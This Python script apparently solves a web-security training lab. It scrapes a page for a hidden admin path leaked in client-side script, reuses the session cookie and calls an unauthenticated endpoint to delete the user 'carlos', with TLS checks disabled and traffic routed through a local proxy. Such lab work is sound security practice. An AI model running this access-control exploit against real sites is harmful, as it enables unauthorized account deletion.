import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def is_delete_carlos_successful(url):
    response = requests.get(
        url,
        verify=False,
        proxies=proxies)
    session_cookie = (
        response.cookies
            .get_dict()
            .get('session'))
    lxml = BeautifulSoup(
        response.text,
        'lxml')
    admin_instances = lxml.find(
        string=re.compile("/admin-"))
    admin_path = re.search(
        "href', '(.*)'", admin_instances)[1]
    cookies = {
        'session': session_cookie}
    delete_carlos_url = (
        url + admin_path + '/delete?username=carlos')
    response = requests.get(
        delete_carlos_url,
        cookies=cookies,
        verify=False,
        proxies=proxies)
    return response.status_code == 200

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        print("[+] Starting Access Control attack...")
        if not is_delete_carlos_successful(url):
            print("[-] Deleting carlos was not successful.")
            sys.exit(FAIL)
        print("[+] The Access Control attack was successful.")
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print('[-] Example: %s www.example.com' % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("[-] An exception occured %s" % exception)
        print("[-] The Access Control attack was not successful.")
        sys.exit(FAIL) 